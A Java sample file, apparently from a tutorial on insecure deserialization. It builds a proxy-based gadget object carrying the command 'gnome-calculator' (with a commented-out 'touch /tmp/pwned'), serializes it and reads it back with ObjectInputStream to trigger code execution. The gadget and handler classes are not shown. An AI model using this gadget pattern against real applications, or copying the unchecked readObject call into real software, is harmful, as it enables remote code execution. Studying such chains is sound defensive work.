package sample2;

import java.io.*;
import java.lang.reflect.Proxy;
import java.util.Map;

/**
 * Created by skirge on 19.01.17.
 */
public class Sample2 {

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // prepare serialized object
        Gadget2 g = getGadget();

        byte[] bytes = serialize(g);
        // application reads serialized data
        Gadget2 g2 = readGadget(bytes);
        System.out.println("[*] Gadget deserialized: " + g2);
    }

    private static Gadget2 getGadget() {
        Handler2 h = new Handler2();
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();

        Map proxy = (Map) Proxy.newProxyInstance(classLoader,
                new Class<?>[] { Map.class }, h);

        Gadget2 g = new Gadget2();

        g.map = proxy;
        //g.key = "touch /tmp/pwned";
        g.key = "gnome-calculator";
        return g;
    }


    private static byte[] serialize(Gadget2 g) throws IOException {
        //File f = new File("/tmp/deser2.bin");
        //FileOutputStream fout = new FileOutputStream(f);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(g);
        byte[] bytes = baos.toByteArray();
        //fout.write(bytes);
        return bytes;
    }

    private static Gadget2 readGadget(byte[] bytes) throws IOException,
            ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));
        Gadget2 g2 = (Gadget2) ois.readObject();
        return g2;
    }

}
